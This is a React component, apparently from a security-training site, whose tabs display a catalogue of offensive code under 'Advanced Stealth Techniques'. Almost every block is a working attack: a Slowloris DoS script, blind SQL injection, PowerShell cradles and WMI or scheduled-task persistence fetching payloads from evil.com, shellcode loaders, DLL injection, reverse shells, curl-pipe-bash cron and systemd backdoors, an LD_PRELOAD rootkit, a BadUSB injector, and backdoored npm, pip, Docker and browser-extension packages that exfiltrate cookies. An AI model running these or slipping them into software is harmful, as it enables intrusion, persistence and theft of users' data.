
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { EyeOff, Clock, Cpu, Zap } from 'lucide-react';

const StealthTechniques: React.FC = () => {
  return (
    <Card className="bg-cybr-card border-cybr-muted">
      <CardHeader>
        <CardTitle className="text-cybr-primary flex items-center gap-2">
          <EyeOff className="h-6 w-6" />
          Advanced Stealth Techniques
        </CardTitle>
      </CardHeader>
      <CardContent>
        <Tabs defaultValue="timing-attacks" className="w-full">
          <TabsList className="grid grid-cols-2 md:grid-cols-4 w-full mb-6">
            <TabsTrigger value="timing-attacks">Timing Attacks</TabsTrigger>
            <TabsTrigger value="memory-resident">Memory Resident</TabsTrigger>
            <TabsTrigger value="living-off-land">Living off Land</TabsTrigger>
            <TabsTrigger value="advanced-persistence">Advanced Persistence</TabsTrigger>
          </TabsList>

          <TabsContent value="timing-attacks" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Timing-Based Attack Techniques</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Slow and Low Attacks</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Slow HTTP DoS (Slowloris)
import socket
import time
import threading

def slowloris_attack(target, port=80, socket_count=200):
    sockets = []
    
    # Create sockets
    for i in range(socket_count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target, port))
            sock.send(f"GET /?{i} HTTP/1.1\\r\\n".encode())
            sock.send(f"Host: {target}\\r\\n".encode())
            sock.send("User-Agent: Mozilla/5.0\\r\\n".encode())
            sock.send("Accept-language: en-US,en,q=0.5\\r\\n".encode())
            sockets.append(sock)
        except socket.error:
            break
    
    # Keep connections alive
    while True:
        for sock in sockets:
            try:
                sock.send("X-a: b\\r\\n".encode())
            except socket.error:
                sockets.remove(sock)
                # Create new socket
                try:
                    new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_sock.settimeout(4)
                    new_sock.connect((target, port))
                    new_sock.send("GET / HTTP/1.1\\r\\n".encode())
                    sockets.append(new_sock)
                except:
                    pass
        time.sleep(15)

# Time-delayed Exploitation
def time_based_blind_sqli(url, payload_template):
    import requests
    
    for i in range(1, 100):  # Test string length
        payload = payload_template.format(i)
        start_time = time.time()
        
        try:
            response = requests.get(url + payload, timeout=10)
            response_time = time.time() - start_time
            
            if response_time > 5:  # 5 second delay indicates true condition
                print(f"Length found: {i}")
                return i
        except requests.Timeout:
            print(f"Length found: {i}")
            return i
        
        time.sleep(0.1)  # Small delay between requests

# Usage
# time_based_blind_sqli("http://target.com/search?q=", 
#                      "test' AND IF(LENGTH(database())={},SLEEP(5),0)--")`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Staggered Attacks</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Distributed Timing Attack
import random
import threading
import time

class StaggeredAttack:
    def __init__(self, targets, payloads):
        self.targets = targets
        self.payloads = payloads
        self.results = []
    
    def single_attack(self, target, payload):
        # Random delay between 1-60 minutes
        delay = random.randint(60, 3600)
        time.sleep(delay)
        
        try:
            # Execute attack
            result = self.execute_payload(target, payload)
            self.results.append((target, payload, result, time.time()))
        except Exception as e:
            print(f"Attack failed on {target}: {e}")
    
    def execute_payload(self, target, payload):
        import requests
        try:
            response = requests.get(f"http://{target}/{payload}", timeout=5)
            return response.status_code
        except:
            return None
    
    def launch_campaign(self):
        threads = []
        
        for target in self.targets:
            for payload in self.payloads:
                t = threading.Thread(target=self.single_attack, args=(target, payload))
                t.daemon = True
                t.start()
                threads.append(t)
                
                # Stagger thread creation
                time.sleep(random.randint(1, 30))
        
        # Wait for all threads
        for t in threads:
            t.join()

# Long-term Reconnaissance
def passive_recon_campaign(target_domain):
    import dns.resolver
    
    subdomains = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'staging']
    
    for subdomain in subdomains:
        try:
            full_domain = f"{subdomain}.{target_domain}"
            answers = dns.resolver.resolve(full_domain, 'A')
            for answer in answers:
                print(f"Found: {full_domain} -> {answer}")
        except:
            pass
        
        # Wait 24-48 hours between subdomain checks
        delay = random.randint(86400, 172800)  # 24-48 hours
        time.sleep(delay)`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Seasonal Attack Timing</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Schedule attacks during low-activity periods
import datetime
import schedule
import time

def is_business_hours():
    now = datetime.datetime.now()
    # Check if it's weekend
    if now.weekday() >= 5:  # Saturday = 5, Sunday = 6
        return False
    
    # Check if it's business hours (9 AM - 5 PM)
    if 9 <= now.hour < 17:
        return True
    
    return False

def holiday_aware_attack():
    holidays = [
        datetime.date(2024, 1, 1),   # New Year
        datetime.date(2024, 7, 4),   # Independence Day
        datetime.date(2024, 12, 25), # Christmas
        # Add more holidays
    ]
    
    today = datetime.date.today()
    if today in holidays:
        print("Holiday detected, postponing attack")
        return False
    
    return True

def stealth_attack_scheduler():
    if not is_business_hours() and holiday_aware_attack():
        print("Executing stealth attack...")
        # Execute your attack here
        execute_attack()
    else:
        print("Waiting for optimal timing...")

# Schedule attacks for non-business hours
schedule.every().day.at("02:00").do(stealth_attack_scheduler)  # 2 AM
schedule.every().day.at("03:30").do(stealth_attack_scheduler)  # 3:30 AM
schedule.every().saturday.at("14:00").do(stealth_attack_scheduler)  # Weekend
schedule.every().sunday.at("16:00").do(stealth_attack_scheduler)

def execute_attack():
    # Your attack code here
    pass

# Run scheduler
while True:
    schedule.run_pending()
    time.sleep(60)`}
                </pre>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="memory-resident" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Memory-Resident Techniques</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Fileless PowerShell Attacks</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# In-Memory PowerShell Execution
# Download and execute script without touching disk
powershell -nop -c "IEX((New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'))"

# Base64 encoded command execution
$command = "Write-Host 'Fileless attack'"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded

# Reflective DLL loading
$dllBytes = [System.IO.File]::ReadAllBytes("C:\\temp\\malicious.dll")
$assembly = [System.Reflection.Assembly]::Load($dllBytes)
$type = $assembly.GetType("Malicious.Class")
$method = $type.GetMethod("Execute")
$method.Invoke($null, @())

# PowerShell Empire-style launcher
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$Script = $wc.DownloadString("http://evil.com/launcher")
Invoke-Expression $Script

# Memory-resident backdoor
$code = @"
using System;
using System.Runtime.InteropServices;

public class MemoryExecution {
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    public static void Execute(byte[] shellcode) {
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
"@

Add-Type -TypeDefinition $code -Language CSharp
$shellcode = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8)  # Your shellcode here
[MemoryExecution]::Execute($shellcode)`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Process Injection Techniques</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# DLL Injection
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class ProcessInjection {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    public static void InjectDLL(int processId, string dllPath) {
        IntPtr hProcess = OpenProcess(0x1F0FFF, false, processId);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), 0x3000, 0x40);
        
        UIntPtr bytesWritten;
        WriteProcessMemory(hProcess, addr, System.Text.Encoding.Default.GetBytes(dllPath), (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
        
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA"), addr, 0, IntPtr.Zero);
    }
}
"@

# Inject into notepad process
$notepadProcess = Get-Process notepad | Select-Object -First 1
[ProcessInjection]::InjectDLL($notepadProcess.Id, "C:\\temp\\malicious.dll")

# Process Hollowing
$code = @"
using System;
using System.Runtime.InteropServices;

public class ProcessHollowing {
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    public struct STARTUPINFO {
        public Int32 cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
}
"@`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Registry-less Persistence</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# WMI Event Subscription Persistence
# Create WMI event consumer
$consumer = Set-WmiInstance -Class __EventConsumer -Namespace "root\\subscription" -Arguments @{
    Name = "SystemMonitor"
    CommandLineTemplate = 'powershell.exe -NoP -W Hidden -C "IEX((New-Object Net.WebClient).DownloadString(\"http://evil.com/payload.ps1\"))"'
}

# Create WMI event filter
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{
    Name = "SystemFilter"
    EventNameSpace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM Win32_LogonSession WHERE LogonType = 2"
}

# Bind filter to consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}

# COM Hijacking without registry
$code = @"
using System;
using System.Runtime.InteropServices;

[ComVisible(true)]
[Guid("CLSID-GUID-HERE")]
[ClassInterface(ClassInterfaceType.None)]
public class HijackedCOM : IDispatch {
    public void Execute() {
        // Malicious code here
        System.Diagnostics.Process.Start("calc.exe");
    }
}
"@

Add-Type -TypeDefinition $code
$com = New-Object HijackedCOM

# Scheduled Task with XML (no schtasks.exe)
$taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2">
  <Triggers>
    <LogonTrigger>
      <StartBoundary>1999-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NoP -W Hidden -C "IEX((New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1'))"</Arguments>
    </Exec>
  </Actions>
</Task>
"@

$taskService = New-Object -ComObject Schedule.Service
$taskService.Connect()
$taskFolder = $taskService.GetFolder("\\")
$taskFolder.RegisterTask("SystemUpdate", $taskXml, 6, $null, $null, 3)`}
                </pre>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="living-off-land" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Living off the Land Techniques</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Windows Built-in Tools</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# BitsAdmin for downloads
bitsadmin /transfer myDownloadJob /download /priority normal http://evil.com/payload.exe C:\\temp\\payload.exe && C:\\temp\\payload.exe

# CertUtil for downloads and encoding
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe
certutil -encode payload.exe encoded.txt
certutil -decode encoded.txt decoded.exe

# MSBuild for code execution
# malicious.xml
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Execute">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;
          
          public class ClassExample : Task, ITask {
            public override bool Execute() {
              System.Diagnostics.Process.Start("calc.exe");
              return true;
            }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>

# Execute: msbuild.exe malicious.xml

# RegSvr32 for script execution
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll

# file.sct content:
<?XML version="1.0"?>
<scriptlet>
<registration description="Desc" progid="Progid" version="0" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}">
  <script language="JScript">
    <![CDATA[
      var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
    ]]>
  </script>
</registration>
</scriptlet>

# WMIC for remote execution
wmic /node:target.com process call create "cmd.exe /c echo malicious > C:\\temp\\output.txt"

# ForFiles for execution
forfiles /p C:\\windows\\system32 /m notepad.exe /c "cmd /c echo malicious"

# Replace.exe for file operations
echo malicious > temp.txt
replace.exe temp.txt C:\\windows\\system32\\drivers\\etc\\hosts

# Mavinject for DLL injection
mavinject.exe /INJECTRUNNING /PID:1234 C:\\temp\\malicious.dll`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">PowerShell Without PowerShell</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# PowerShell through .NET reflection
$code = @"
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

public class PSExecutor {
    public static string Execute(string command) {
        RunspaceConfiguration config = RunspaceConfiguration.Create();
        Runspace runspace = RunspaceFactory.CreateRunspace(config);
        runspace.Open();
        
        Pipeline pipeline = runspace.CreatePipeline();
        pipeline.Commands.AddScript(command);
        
        var results = pipeline.Invoke();
        runspace.Close();
        
        string output = "";
        foreach (PSObject result in results) {
            output += result.ToString() + "\\n";
        }
        return output;
    }
}
"@

Add-Type -TypeDefinition $code -ReferencedAssemblies System.Management.Automation
$result = [PSExecutor]::Execute("Get-Process")

# C# PowerShell execution
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

class Program {
    static void Main() {
        using (PowerShell ps = PowerShell.Create()) {
            ps.AddScript("IEX((New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'))");
            ps.Invoke();
        }
    }
}

# VBScript PowerShell execution
CreateObject("WScript.Shell").Run "powershell -NoP -W Hidden -C ""IEX((New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1'))"""

# JScript PowerShell execution
var shell = new ActiveXObject("WScript.Shell");
shell.Run("powershell -NoP -W Hidden -C \"IEX((New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1'))\"", 0, false);`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Linux Living off the Land</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Curl/Wget for downloads and execution
curl http://evil.com/script.sh | bash
wget -O- http://evil.com/script.sh | sh

# SSH for tunneling and execution
ssh -L 8080:internal-server:80 user@jump-host
ssh user@target "bash -c 'curl http://evil.com/payload.sh | bash'"

# Netcat for backdoors
nc -l -p 4444 -e /bin/bash  # Traditional backdoor
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f

# Cron for persistence
echo "* * * * * curl http://evil.com/check.sh | bash" | crontab -

# Python one-liners
python -c "import urllib2,subprocess;subprocess.call(urllib2.urlopen('http://evil.com/cmd').read(),shell=True)"
python3 -c "import urllib.request,subprocess;subprocess.call(urllib.request.urlopen('http://evil.com/cmd').read().decode(),shell=True)"

# Perl reverse shell
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby reverse shell
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# AWK execution
awk 'BEGIN {system("curl http://evil.com/payload.sh | bash")}'

# Find command execution
find /tmp -exec curl http://evil.com/payload.sh \\; -exec bash payload.sh \\; -quit

# Systemd for persistence (as root)
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do curl http://evil.com/check.sh | bash; sleep 3600; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service`}
                </pre>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="advanced-persistence" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Advanced Persistence Mechanisms</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Rootkit Techniques</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Windows Rootkit - Process Hiding
$code = @"
using System;
using System.Runtime.InteropServices;

public class ProcessHiding {
    [DllImport("ntdll.dll")]
    static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
    
    public static void HideProcess() {
        int breakOnTermination = 1;
        NtSetInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 0x1D, ref breakOnTermination, sizeof(int));
    }
}
"@

Add-Type -TypeDefinition $code
[ProcessHiding]::HideProcess()

# Hook API functions
$code = @"
using System;
using System.Runtime.InteropServices;

public class APIHooking {
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    
    public static void HookAPI() {
        // Hook CreateFileW to hide files
        IntPtr createFileAddr = GetProcAddress(LoadLibrary("kernel32.dll"), "CreateFileW");
        byte[] hookBytes = { 0x48, 0x31, 0xC0, 0xC3 }; // xor rax, rax; ret
        uint bytesWritten;
        WriteProcessMemory(GetCurrentProcess(), createFileAddr, hookBytes, (uint)hookBytes.Length, out bytesWritten);
    }
}
"@

# Linux Rootkit - LD_PRELOAD
# Create malicious shared library
cat > /tmp/rootkit.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

static int (*original_readdir)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    
    struct dirent *entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        // Hide files starting with "hidden_"
        if (strncmp(entry->d_name, "hidden_", 7) != 0) {
            break;
        }
    }
    return entry;
}
EOF

gcc -shared -fPIC -o /tmp/rootkit.so /tmp/rootkit.c -ldl
export LD_PRELOAD=/tmp/rootkit.so`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Firmware-Level Persistence</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# UEFI Bootkit (conceptual - requires significant expertise)
# This is for educational purposes and requires deep system knowledge

# UEFI DXE Driver Template
[Defines]
  INF_VERSION                    = 0x00010005
  BASE_NAME                      = MaliciousDriver
  FILE_GUID                      = 12345678-1234-1234-1234-123456789012
  MODULE_TYPE                    = DXE_DRIVER
  VERSION_STRING                 = 1.0
  ENTRY_POINT                    = MaliciousDriverEntryPoint

[Sources]
  MaliciousDriver.c

[Packages]
  MdePkg/MdePkg.dec

[LibraryClasses]
  UefiDriverEntryPoint
  UefiLib
  DebugLib

# MaliciousDriver.c (simplified)
#include <Uefi.h>
#include <Library/UefiLib.h>

EFI_STATUS
EFIAPI
MaliciousDriverEntryPoint (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  // Install malicious protocol or hook system services
  // This would require extensive UEFI development knowledge
  return EFI_SUCCESS;
}

# BIOS/MBR Infection (Legacy systems)
# Create malicious boot sector
nasm -f bin -o malicious_mbr.bin << 'EOF'
[BITS 16]
[ORG 0x7C00]

start:
    ; Save original MBR
    mov ax, 0x0201
    mov bx, 0x7E00
    mov cx, 0x0002
    mov dx, 0x0080
    int 0x13
    
    ; Install payload
    ; ... malicious code here ...
    
    ; Jump to original MBR
    jmp 0x0000:0x7E00
    
times 510-($-$$) db 0
dw 0xAA55
EOF

# Write to MBR (EXTREMELY DANGEROUS - for research only)
# dd if=malicious_mbr.bin of=/dev/sda bs=512 count=1

# Hardware Implant Simulation
# Raspberry Pi Pico as USB device
# micropython code for Pi Pico
import usb_hid
import time
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode

kbd = Keyboard(usb_hid.devices)

# Wait for system to boot
time.sleep(30)

# Open command prompt and execute payload
kbd.press(Keycode.GUI, Keycode.R)  # Win+R
kbd.release_all()
time.sleep(0.5)
kbd.type("powershell")
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(2)
kbd.type("IEX((New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1'))")
kbd.press(Keycode.ENTER)
kbd.release_all()`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Supply Chain Persistence</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# NPM Package Backdoor
# package.json
{
  "name": "useful-utility",
  "version": "1.0.0",
  "description": "A helpful utility package",
  "main": "index.js",
  "scripts": {
    "postinstall": "node postinstall.js"
  }
}

# postinstall.js
const https = require('https');
const { exec } = require('child_process');

const payload = Buffer.from('base64encodedpayload', 'base64').toString();
exec(payload, (error, stdout, stderr) => {
    // Silent execution
});

# Legitimate functionality in index.js
module.exports = {
    helperFunction: function() {
        return "This package does something useful";
    }
};

# Python Package Backdoor
# setup.py
from setuptools import setup
from setuptools.command.install import install
import subprocess
import base64

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        # Execute backdoor
        payload = base64.b64decode('base64encodedpayload').decode()
        subprocess.run(payload, shell=True, capture_output=True)

setup(
    name='helpful-package',
    version='1.0.0',
    cmdclass={'install': PostInstallCommand},
    py_modules=['helpful_package']
)

# Docker Image Backdoor
# Dockerfile
FROM ubuntu:20.04

# Install legitimate software
RUN apt-get update && apt-get install -y nginx

# Hidden backdoor
RUN echo 'while true; do curl http://evil.com/check 2>/dev/null | bash 2>/dev/null; sleep 3600; done &' >> /etc/bash.bashrc

# Legitimate entrypoint
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]

# Browser Extension Backdoor
# manifest.json
{
  "manifest_version": 2,
  "name": "Useful Extension",
  "version": "1.0",
  "permissions": ["<all_urls>", "storage", "tabs"],
  "background": {
    "scripts": ["background.js"],
    "persistent": true
  },
  "content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["content.js"]
  }]
}

# background.js
chrome.runtime.onInstalled.addListener(() => {
    // Legitimate functionality
    console.log('Extension installed');
    
    // Hidden backdoor
    setInterval(() => {
        fetch('http://evil.com/exfil', {
            method: 'POST',
            body: JSON.stringify({
                cookies: document.cookie,
                url: window.location.href,
                localStorage: localStorage
            })
        });
    }, 60000);
});`}
                </pre>
              </div>
            </div>
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  );
};

export default StealthTechniques;
